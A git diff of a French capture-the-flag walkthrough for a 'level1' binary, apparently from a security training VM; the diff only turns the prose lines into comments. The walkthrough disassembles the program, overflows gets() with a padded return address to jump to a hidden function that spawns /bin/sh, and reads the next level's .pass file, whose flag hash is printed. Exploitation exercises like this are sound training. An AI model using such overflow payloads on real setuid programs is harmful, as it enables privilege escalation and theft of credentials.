@@ -1,7 +1,7 @@
-Au level1, on a un binaire qui semble lire dans l'entree standard.
-On peux voir qu'il a les droits de level2, ce qui devrait nous permettre d'executer du code avec ses droits.
+#	Au level1, on a un binaire qui semble lire dans l'entree standard.
+#	On peux voir qu'il a les droits de level2, ce qui devrait nous permettre d'executer du code avec ses droits.
 
-Jetons un oeil au code avec gdb:
+#	Jetons un oeil au code avec gdb:
 
 $> gdb level1
 disass main
@@ -17,8 +17,8 @@ Dump of assembler code for function main:
    0x08048496 <+22>:	ret
 End of assembler dump.
 
-On peux voir que le programme ne fait rien de special si ce n'est de faire un appel a gets qui lit dans stdout.
-Il est possible d'exploiter gets en faisant un overflow du buffer (qui est ici de 76) afin de modifier la valeur du jmp de gets. Verifions si il y a une fonction non appellee avec objdump:
+#	On peux voir que le programme ne fait rien de special si se n'est de faire un appel a gets qui lit dans stdout.
+#	Il est possible d'exploiter gets en faisant un overflow du buffer (qui est ici de 76) afin de modifier la valeur du jmp de gets. Verifions si il y a une fonction non appellee avec objdump:
 
 $> objdump -S level1
 [...]
@@ -42,18 +42,18 @@ $> objdump -S level1
  804847f:	c3                   	ret
 [...]
 
-Effectivement, on voit qu'une fonction faisant un fwrite suivi d'un "/bin/sh" existe mais n'est pas appelee. La solution de l'overflow de gets est donc la bonne.
+#	Effectivement, on voit qu'une fonction faisant un fwrite suivi d'un "/bin/sh" existe mais n'est pas appelee. La solution de l'overflow de gets est donc la bonne.
 
-On peux voir que l'adresse de run est 08048444, je vais donc preparer un petit exploit:
+#	On peux voir que l'adresse de run est 08048444, je vais donc preparer un petit exploit:
 
 $> echo -e -n 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x84\x04\x08' > /Ressources/exploit
 
-Ensuite on envoi l'exploit sur la vm via scp:
+#	Ensuite on envoi l'exploit sur la vm via scp:
 
 $> scp -P 4242 Ressources/exploit level1@192.168.59.121:/tmp/exploit
 
-L'overflow du buffer va venir modifier la valeur du jmp qui suit l'appel a read. De ce fait, au lieu de rejump sur main a la fin de gets, on va maintenant jmp sur run.
-Afin d'eviter que le programme segfault directement, on va utiliser 'cat -' afin qu'il lise dans l'entree standard.
+#	L'overflow du buffer va venir modifier la valeur du jmp qui suit l'appel a read. De ce fait, au lieu de rejump sur main a la fin de gets, on va maintenant jmp sur run.
+#	Afin d'eviter que le programme segfault directement, on va utiliser 'cat -' afin qu'il lise dans l'entree standard.
 
 $> cat /tmp/exploit - | ./level1
 
@@ -63,4 +63,4 @@ level2
 cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 
-Ca y est, l'appel systeme "/bin/sh" a bien eu lieu et nous pouvons maintenant aller chercher .pass
+#	Ca y est, l'appel systeme "/bin/sh" a bien eu lieu et nous pouvons maintenant aller chercher .pass
